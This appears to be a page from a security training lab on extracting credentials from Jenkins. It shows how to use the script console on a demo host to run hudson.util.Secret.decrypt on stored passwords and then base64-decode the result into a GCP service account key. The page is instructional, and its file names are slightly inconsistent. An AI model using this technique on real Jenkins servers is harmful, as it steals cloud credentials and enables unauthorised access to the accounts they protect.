---
title: Jenkins Decrypt
weight: 23
---

Now that we're in Jenkins, we'll look a bit around.

# Explore Secrets

As we can see, there are predefined secrets. Some of them are maybe used for Terraform. Why not decrypt them!

Let's first get the secret:
{{% expand "Solution" %}}
Open the following url:

```bash
<http://jenkins.test.nevervictimconsult.xyz/script>
```

Then start the following script:

```bash
println( hudson.util.Secret.decrypt("${ENCRYPTED_PASSPHRASE_OR_PASSWORD}") )
```

Where ${ENCRYPTED_PASSPHRASE_OR_PASSWORD} is the encrypted content of the <password> or <passphrase> XML element that you are looking for.

 In order to get the password value of ${ENCRYPTED_PASSPHRASE_OR_PASSWORD} go to credentials, update, in the browser "See source code" and you will get the encrypted password in the data field for password. Then use that function.

{{% /expand %}}

Now guess what you've just got. It is the base64 encoded json string for authenticating to GCP!

We still need to decrypt it of course:

{{% expand "Solution" %}}

```bash
mkdir -p /root/demotalk/cloudAccess
cd /root/demotalk/cloudAccess
nano encoded.json
```

Paste the string into encrypted.json. and decode it then:

```bash
cd /root/demotalk/cloudAccess
cat encode.json | base64 --decode > gcpSa.json
```

{{% /expand %}}

Congratulations, you have just leaked a secret to authenticate to GCP!
